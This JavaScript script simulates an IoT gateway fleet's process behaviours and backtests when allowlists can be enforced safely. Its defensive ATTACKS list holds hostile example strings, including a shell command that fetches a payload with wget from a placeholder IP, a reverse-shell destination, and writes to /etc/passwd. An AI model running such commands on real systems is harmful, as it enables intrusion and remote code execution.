// Seeded fleet simulation + committed results.  node scripts/generate.mjs
import { writeFileSync } from 'node:fs';
import { rng, coverage, decide, allowlist, etaDays, pendingJobs } from '../src/readiness.js';

export const SEED = 20261111;
export const DEVICES = 600;
export const DAYS = 41; // monitor mode from Fri 2 Oct 2026 through Wed 11 Nov 2026
export const START = '2026-10-02';
export const BUDGET = { perDeviceDay: 0.001, minDays: 14 };
export const CONF = 0.95;
export const CUTOFFS = [7, 14, 21, 27];
export const HORIZON = 14;

const dow = (d) => (5 + d) % 7; // day 0 = Friday 2 Oct; 0 = Sunday
const SUNDAYS = Array.from({ length: DAYS }, (_, d) => d).filter((d) => dow(d) === 0);
const FIRSTS = [30]; // 1 Nov (monitoring started 2 Oct, so the 1 Oct run was missed)
const OTA = [8, 9, 10]; // staged firmware 3.2.1 -> 3.2.2 rollout, 10-12 Oct

// Scheduled jobs declared in the firmware image (/etc/crontabs/root, as extracted by Analyzer).
export const SCHEDULED = [
  { proc: 'crond', behavior: 'crond:exec-logrotate', cron: '0 3 * * 0', label: 'Weekly log rotation', next: 'Sun 03:00' },
  { proc: 'crond', behavior: 'crond:exec-cert-renew', cron: '0 2 1 * *', label: 'Monthly device certificate renewal', next: '1 Nov 02:00' },
  { proc: 'cert-renew', behavior: 'cert-renew:connect-est', cron: '0 2 1 * *', label: 'EST enrollment (spawned by the monthly job)', next: '1 Nov 02:00' },
];

// Long tail of rare legitimate behaviors per process: pi_i = top * i^-s, i = 1..M.
const TAILS = {
  lighttpd: { M: 60, top: 0.0016, s: 1.25, type: 'FileOpened', gen: (i) => [`read-asset-${i}`, `payload.filename == "/www/assets/${(i * 7919).toString(36)}.js"`] },
  mosquitto: { M: 4, top: 0.0006, s: 1.5, type: 'FileOpened', gen: (i) => [`read-bridge-${i}`, `payload.filename == "/etc/mosquitto/conf.d/bridge${i}.conf"`] },
  'modbus-bridge': { M: 18, top: 0.0009, s: 1.4, type: 'Connect', gen: (i) => [`connect-plc-${i}`, `payload.destination == "10.20.${i}.10:502"`] },
  'telemetry-agent': { M: 10, top: 0.0005, s: 1.5, type: 'DnsQuery', gen: (i) => [`dns-ntp-${i}`, `payload.questions CONTAINS "${i}.pool.ntp.org"`] },
  'ota-agent': { M: 6, top: 0.0004, s: 1.6, type: 'FileOpened', gen: (i) => [`read-delta-${i}`, `payload.filename == "/data/ota/delta-${i}.idx"`] },
  dropbear: { M: 140, top: 0.0022, s: 1.15, type: 'Exec', gen: (i) => [`exec-tool-${i}`, `payload.filename == "/bin/busybox" AND payload.argv[0] == "${['ps','df','top','free','dmesg','ifconfig','route','netstat','uptime','cat','vi','mount','iostat','kill','ping','traceroute','nslookup','wget','tail','grep'][i % 20]}${i >= 20 ? '-' + Math.floor(i / 20) : ''}"`] },
  crond: { M: 2, top: 0.0002, s: 1.5, type: 'Exec', gen: (i) => [`exec-hook-${i}`, `payload.filename == "/etc/periodic/hook${i}"`] },
  udhcpc: { M: 3, top: 0.0003, s: 1.5, type: 'FileOpened', gen: (i) => [`write-lease-${i}`, `payload.filename == "/var/lib/udhcpc/eth${i}.lease"`] },
  syslogd: { M: 2, top: 0.0002, s: 1.5, type: 'FileOpened', gen: (i) => [`write-rotated-${i}`, `payload.filename == "/var/log/messages.${i}"`] },
  'node-red': { M: 90, top: 0.0012, s: 1.2, type: 'FileOpened', gen: (i) => [`read-node-${i}`, `payload.filename STARTS_WITH "/data/node-red/node_modules/node-red-contrib-${(i * 104729).toString(36)}/"`] },
  connmand: { M: 8, top: 0.0006, s: 1.5, type: 'Exec', gen: (i) => [`exec-apn-${i}`, `payload.filename == "/usr/bin/qmicli" AND payload.argv CONTAINS "apn${i}"`] },
};

// Behaviors: type follows Pulsar event payloads (Exec, FileOpened, Connect, ...).
// pi = probability per device-day. schedule = calendar days on which it fires fleet-wide (onDayP per device).
const P = (name, image, owner, behaviors) => ({ name, image, owner, behaviors });
const B = (slug, type, cond, pi, extra = {}) => ({ slug, type, cond, pi, ...extra });

function catalog() {
  return [
    P('lighttpd', '/usr/sbin/lighttpd', 'Web UI', [
      B('read-www', 'FileOpened', 'payload.filename STARTS_WITH "/www/"', 0.97),
      B('exec-status-cgi', 'Exec', 'payload.filename == "/www/cgi-bin/status.cgi"', 0.92),
      B('exec-config-cgi', 'Exec', 'payload.filename == "/www/cgi-bin/config.cgi"', 0.08),
      B('write-uploads', 'FileOpened', 'payload.filename STARTS_WITH "/tmp/uploads/" AND payload.flags CONTAINS "O_WRONLY"', 0.004),
      B('exec-fwupload-cgi', 'Exec', 'payload.filename == "/www/cgi-bin/fwupload.cgi"', 0.0009),
      B('read-lang-de', 'FileOpened', 'payload.filename == "/www/i18n/de.json"', 0.03),
      B('read-lang-it', 'FileOpened', 'payload.filename == "/www/i18n/it.json"', 0.02),
      B('read-lang-pl', 'FileOpened', 'payload.filename == "/www/i18n/pl.json"', 0.0016),
    ]),
    P('mosquitto', '/usr/sbin/mosquitto', 'MQTT broker', [
      B('bind-1883', 'Bind', 'payload.address == "0.0.0.0:1883"', 1.0),
      B('read-acl', 'FileOpened', 'payload.filename == "/etc/mosquitto/acl"', 0.99),
      B('write-persist', 'FileOpened', 'payload.filename == "/var/lib/mosquitto/mosquitto.db"', 0.95),
      B('read-passwd-file', 'FileOpened', 'payload.filename == "/etc/mosquitto/passwd"', 0.6),
    ]),
    P('modbus-bridge', '/opt/gw/bin/modbus-bridge', 'Field bus', [
      B('open-ttyS1', 'FileOpened', 'payload.filename == "/dev/ttyS1"', 0.99),
      B('connect-mqtt-local', 'Connect', 'payload.destination == "127.0.0.1:1883"', 1.0),
      B('connect-plc-502', 'Connect', 'payload.destination PORT 502', 0.7),
      B('write-map-cache', 'FileOpened', 'payload.filename == "/var/cache/modbus/map.bin"', 0.5),
      B('open-ttyS2', 'FileOpened', 'payload.filename == "/dev/ttyS2"', 0.012),
    ]),
    P('telemetry-agent', '/usr/bin/python3 /opt/gw/telemetry.py', 'Cloud uplink', [
      B('connect-ingest', 'Connect', 'payload.destination == "ingest.gw-cloud.eu:8883"', 1.0),
      B('dns-ingest', 'DnsQuery', 'payload.questions CONTAINS "ingest.gw-cloud.eu"', 1.0),
      B('write-spool', 'FileOpened', 'payload.filename STARTS_WITH "/var/spool/telemetry/"', 0.98),
      B('read-device-cert', 'FileOpened', 'payload.filename == "/etc/gw/device.crt"', 1.0),
      B('connect-ingest-fallback', 'Connect', 'payload.destination == "ingest2.gw-cloud.eu:8883"', 0.006),
      B('dns-ingest-fallback', 'DnsQuery', 'payload.questions CONTAINS "ingest2.gw-cloud.eu"', 0.006),
      B('exec-ip-route', 'Exec', 'payload.filename == "/sbin/ip" AND payload.argv CONTAINS "route"', 0.03),
    ]),
    P('ota-agent', '/opt/gw/bin/ota-agent', 'Updates', [
      B('connect-update', 'Connect', 'payload.destination == "update.gw-cloud.eu:443"', 1.0),
      B('read-manifest', 'FileOpened', 'payload.filename == "/data/ota/manifest.json"', 1.0),
      B('write-bundle', 'FileOpened', 'payload.filename STARTS_WITH "/data/ota/bundles/"', 0, { schedule: OTA, onDayP: 0.34 }),
      B('exec-swupdate', 'Exec', 'payload.filename == "/usr/bin/swupdate"', 0, { schedule: OTA, onDayP: 0.33 }),
      B('exec-fw-setenv', 'Exec', 'payload.filename == "/usr/sbin/fw_setenv"', 0, { schedule: OTA, onDayP: 0.33 }),
      B('exec-reboot', 'Exec', 'payload.filename == "/sbin/reboot"', 0.002),
    ]),
    P('dropbear', '/usr/sbin/dropbear', 'Service access', [
      B('bind-22', 'Bind', 'payload.address == "0.0.0.0:22"', 1.0),
      B('read-hostkey', 'FileOpened', 'payload.filename == "/etc/dropbear/dropbear_ed25519_host_key"', 1.0),
      B('exec-ash', 'Exec', 'payload.filename == "/bin/ash"', 0.004),
      B('exec-scp', 'Exec', 'payload.filename == "/usr/bin/scp"', 0.0012),
      B('exec-logread', 'Exec', 'payload.filename == "/sbin/logread"', 0.0025),
      B('exec-fw-printenv', 'Exec', 'payload.filename == "/usr/sbin/fw_printenv"', 0.0006),
      B('exec-tcpdump', 'Exec', 'payload.filename == "/usr/sbin/tcpdump"', 0.00025),
    ]),
    P('crond', '/usr/sbin/crond', 'Scheduler', [
      B('exec-ntp-sync', 'Exec', 'payload.filename == "/usr/sbin/ntpd" AND payload.argv CONTAINS "-q"', 1.0),
      B('exec-healthcheck', 'Exec', 'payload.filename == "/opt/gw/bin/healthcheck"', 1.0),
      B('exec-logrotate', 'Exec', 'payload.filename == "/usr/sbin/logrotate"', 0, { schedule: SUNDAYS, onDayP: 1.0 }),
      B('exec-cert-renew', 'Exec', 'payload.filename == "/opt/gw/bin/cert-renew"', 0, { schedule: FIRSTS, onDayP: 1.0 }),
    ]),
    P('cert-renew', '/opt/gw/bin/cert-renew', 'PKI', [
      B('connect-est', 'Connect', 'payload.destination == "est.gw-cloud.eu:443"', 0, { schedule: FIRSTS, onDayP: 1.0 }),
      B('write-device-key', 'FileOpened', 'payload.filename == "/etc/gw/device.key" AND payload.flags CONTAINS "O_WRONLY"', 0, { schedule: FIRSTS, onDayP: 1.0 }),
      B('write-device-crt', 'FileOpened', 'payload.filename == "/etc/gw/device.crt" AND payload.flags CONTAINS "O_WRONLY"', 0, { schedule: FIRSTS, onDayP: 1.0 }),
      B('exec-openssl', 'Exec', 'payload.filename == "/usr/bin/openssl"', 0, { schedule: FIRSTS, onDayP: 1.0 }),
    ]),
    P('udhcpc', '/sbin/udhcpc', 'Network', [
      B('exec-default-script', 'Exec', 'payload.filename == "/usr/share/udhcpc/default.script"', 1.0),
      B('write-resolv', 'FileOpened', 'payload.filename == "/etc/resolv.conf"', 1.0),
      B('exec-ip', 'Exec', 'payload.filename == "/sbin/ip"', 0.9),
    ]),
    P('syslogd', '/sbin/syslogd', 'Logging', [
      B('write-messages', 'FileOpened', 'payload.filename == "/var/log/messages"', 1.0),
      B('connect-remote-syslog', 'Connect', 'payload.destination PORT 514', 0.25),
    ]),
    P('node-red', '/usr/bin/node /opt/node-red/red.js', 'Edge apps', [
      B('bind-1880', 'Bind', 'payload.address == "127.0.0.1:1880"', 1.0),
      B('connect-mqtt-local', 'Connect', 'payload.destination == "127.0.0.1:1883"', 1.0),
      B('write-flows', 'FileOpened', 'payload.filename == "/data/node-red/flows.json"', 0.05),
      B('read-flows', 'FileOpened', 'payload.filename == "/data/node-red/flows.json"', 1.0),
      B('exec-npm', 'Exec', 'payload.filename STARTS_WITH "/usr/bin/npm"', 0.0018),
      B('connect-npm-registry', 'Connect', 'payload.destination == "registry.npmjs.org:443"', 0.0018),
      B('write-node-modules', 'FileOpened', 'payload.filename STARTS_WITH "/data/node-red/node_modules/"', 0.0018),
      B('connect-http-out', 'Connect', 'payload.destination PORT 443', 0.03),
      B('exec-sh-function', 'Exec', 'payload.filename == "/bin/sh"', 0.0007),
    ]),
    P('connmand', '/usr/sbin/connmand', 'Network', [
      B('read-settings', 'FileOpened', 'payload.filename STARTS_WITH "/var/lib/connman/"', 1.0),
      B('exec-wpa', 'Exec', 'payload.filename == "/usr/sbin/wpa_supplicant"', 0.15),
      B('open-wwan', 'FileOpened', 'payload.filename == "/dev/cdc-wdm0"', 0.11),
      B('exec-qmicli', 'Exec', 'payload.filename == "/usr/bin/qmicli"', 0.11),
    ]),
  ];
}

// Simulated attacks (defensive evaluation): attacker behaviors on given process/day/device.
export const ATTACKS = [
  { id: 'atk-1', title: 'Command injection via config.cgi spawns shell', proc: 'lighttpd', type: 'Exec', what: '/bin/sh -c wget http://198.51.100.7/x', day: 23, device: 118, severity: 'Critical' },
  { id: 'atk-2', title: 'Reverse shell from modbus-bridge', proc: 'modbus-bridge', type: 'Connect', what: '203.0.113.50:4444', day: 25, device: 402, severity: 'Critical' },
  { id: 'atk-3', title: 'Telemetry agent reads PAM configuration', proc: 'telemetry-agent', type: 'FileOpened', what: '/etc/pam.d/common-auth', day: 27, device: 77, severity: 'High' },
  { id: 'atk-4', title: 'MQTT broker writes /etc/passwd', proc: 'mosquitto', type: 'FileOpened', what: '/etc/passwd (O_WRONLY)', day: 29, device: 251, severity: 'High' },
  { id: 'atk-5', title: 'Cron persistence: new job binary executed', proc: 'crond', type: 'Exec', what: '/tmp/.x/kworkerd', day: 31, device: 530, severity: 'Critical' },
  { id: 'atk-6', title: 'Stolen technician key used to start tcpdump on uplink', proc: 'dropbear', type: 'Exec', what: '/usr/sbin/tcpdump -i wwan0', day: 34, device: 9, severity: 'Medium', note: 'tcpdump is legitimate technician behavior seen during monitoring; an allowlist cannot tell it apart' },
];

export function simulate(seed = SEED) {
  const R = rng(seed);
  const procs = catalog();
  // online devices per day: a few offline at random (device-days counted)
  const online = [];
  for (let d = 0; d < DAYS; d++) online.push(Array.from({ length: DEVICES }, () => R() > 0.012));
  const devicesPerDay = online.map((o) => o.filter(Boolean).length);
  const out = [];
  for (const p of procs) {
    const t = TAILS[p.name];
    if (t) for (let i = 1; i <= t.M; i++) { const [slug, cond] = t.gen(i); p.behaviors.push(B(slug, t.type, cond, +(t.top * Math.pow(i, -t.s)).toPrecision(8), { tail: true })); }
    const behaviors = p.behaviors.map((b) => ({ id: `${p.name}:${b.slug}`, slug: b.slug, type: b.type, cond: b.cond, pi: b.pi, schedule: b.schedule || null, onDayP: b.onDayP || 0, tail: !!b.tail, daily: new Array(DAYS).fill(0), events: [] }));
    for (let d = 0; d < DAYS; d++) {
      for (let dev = 0; dev < DEVICES; dev++) {
        if (!online[d][dev]) continue;
        for (const b of behaviors) {
          const p1 = b.schedule ? (b.schedule.includes(d) ? b.onDayP : 0) : b.pi;
          if (p1 > 0 && R() < p1) { b.daily[d]++; if (p1 < 0.05 || b.schedule) b.events.push([d, dev]); }
        }
      }
    }
    out.push({ name: p.name, image: p.image, owner: p.owner, behaviors });
  }
  return { devices: DEVICES, days: DAYS, start: START, devicesPerDay, scheduled: SCHEDULED, procs: out };
}

// Realized false blocks over [k, k+h): device-days where an enforced process shows a behavior outside its allowlist.
export function realized(fleet, k, h, enforced) {
  const bad = new Set();
  let units = 0;
  for (let d = k; d < Math.min(fleet.days, k + h); d++) units += fleet.devicesPerDay[d];
  const perProc = {};
  for (const p of fleet.procs) {
    if (!enforced.has(p.name)) continue;
    const allow = allowlist(p.behaviors, k);
    const s = new Set();
    for (const b of p.behaviors) {
      if (allow.has(b.id)) continue;
      if (b.pi >= 0.05 && !b.schedule) throw new Error(`common behavior ${b.id} missing from allowlist at k=${k}`);
      for (const [d, dev] of b.events) if (d >= k && d < k + h) { s.add(d * 10000 + dev); bad.add(d * 10000 + dev); }
    }
    perProc[p.name] = s.size;
  }
  return { units, blockedDeviceDays: bad.size, rate: units ? bad.size / units : 0, perProc };
}

export function decisions(fleet, k) {
  const out = {};
  for (const p of fleet.procs) {
    const c = coverage(p.behaviors, k, fleet.devicesPerDay, CONF);
    const pending = pendingJobs(fleet.scheduled, p.name, p.behaviors, k);
    const status = decide(c, BUDGET, pending);
    out[p.name] = { status, ...c, pending: pending.map((j) => j.label), eta: status === 'ready' ? 0 : etaDays(p.behaviors, k, fleet.devicesPerDay, BUDGET, CONF) };
  }
  return out;
}

export function attackOutcome(fleet, k, enforced) {
  return ATTACKS.map((a) => {
    const p = fleet.procs.find((x) => x.name === a.proc);
    const allow = allowlist(p.behaviors, k);
    const isLegit = a.proc === 'dropbear' && allow.has('dropbear:exec-tcpdump');
    const outcome = enforced.has(a.proc) ? (isLegit ? 'allowed' : 'blocked') : 'detected';
    return { id: a.id, outcome };
  });
}

export function computeResults(fleet) {
  const backtest = CUTOFFS.map((k) => {
    const dec = decisions(fleet, k);
    const ready = new Set(Object.entries(dec).filter(([, v]) => v.status === 'ready').map(([n]) => n));
    const all = new Set(fleet.procs.map((p) => p.name));
    const gated = realized(fleet, k, HORIZON, ready);
    const naive = realized(fleet, k, HORIZON, all);
    // predicted (union bound) for the gated set, per device-day
    let pred = 0, predUCB = 0;
    for (const n of ready) { pred += dec[n].devRisk; predUCB += dec[n].devUCB; }
    return {
      cutoffDay: k, readyCount: ready.size, ready: [...ready].sort(),
      gated: { blockedDeviceDays: gated.blockedDeviceDays, rate: +gated.rate.toFixed(6), units: gated.units },
      naive: { blockedDeviceDays: naive.blockedDeviceDays, rate: +naive.rate.toFixed(6), perProc: naive.perProc },
      predictedRate: +pred.toFixed(6), predictedUCB: +predUCB.toFixed(6),
    };
  });
  const k = 21; // headline: decide on day 21 (Fri 23 Oct), evaluate the next 14 days (incl. the 1 Nov certificate renewal)
  const bt = backtest.find((b) => b.cutoffDay === k);
  const today = decisions(fleet, DAYS);
  const readyToday = Object.entries(today).filter(([, v]) => v.status === 'ready').map(([n]) => n);
  const atkGated = attackOutcome(fleet, k, new Set(bt.ready));
  return {
    seed: SEED, devices: DEVICES, days: DAYS, budget: BUDGET, conf: CONF, horizon: HORIZON,
    backtest,
    headline: {
      cutoffDay: k,
      readyAtCutoff: bt.readyCount,
      processes: fleet.procs.length,
      gatedFalseBlocks: bt.gated.blockedDeviceDays,
      naiveFalseBlocks: bt.naive.blockedDeviceDays,
      deviceDays: bt.gated.units,
      gatedRatePct: +(100 * bt.gated.rate).toFixed(3),
      naiveRatePct: +(100 * bt.naive.rate).toFixed(3),
      attacksBlocked: atkGated.filter((a) => a.outcome === 'blocked').length,
      attacks: ATTACKS.length,
    },
    today: { day: DAYS, ready: readyToday.sort(), statuses: Object.fromEntries(Object.entries(today).map(([n, v]) => [n, { status: v.status, devUCB: +v.devUCB.toExponential(3), dayUCB: +v.dayUCB.toFixed(4), q1: v.q1, q1day: v.q1day, eta: v.eta }])) },
    attacksAtCutoff: atkGated,
    attacks: ATTACKS,
  };
}

if (import.meta.url === `file://${process.argv[1]}`) {
  const fleet = simulate();
  const slim = { ...fleet, procs: fleet.procs.map((p) => ({ ...p, behaviors: p.behaviors.map(({ events, ...b }) => ({ ...b, rareEvents: events.length })) })) };
  writeFileSync(new URL('../data/fleet.json', import.meta.url), JSON.stringify(slim));
  const res = computeResults(fleet);
  writeFileSync(new URL('../data/results.json', import.meta.url), JSON.stringify(res, null, 2));
  console.log(JSON.stringify({ headline: res.headline, backtest: res.backtest.map((b) => ({ k: b.cutoffDay, ready: b.readyCount, g: b.gated.blockedDeviceDays, n: b.naive.blockedDeviceDays, pred: b.predictedUCB, rate: b.gated.rate })), today: res.today.statuses }, null, 1));
}
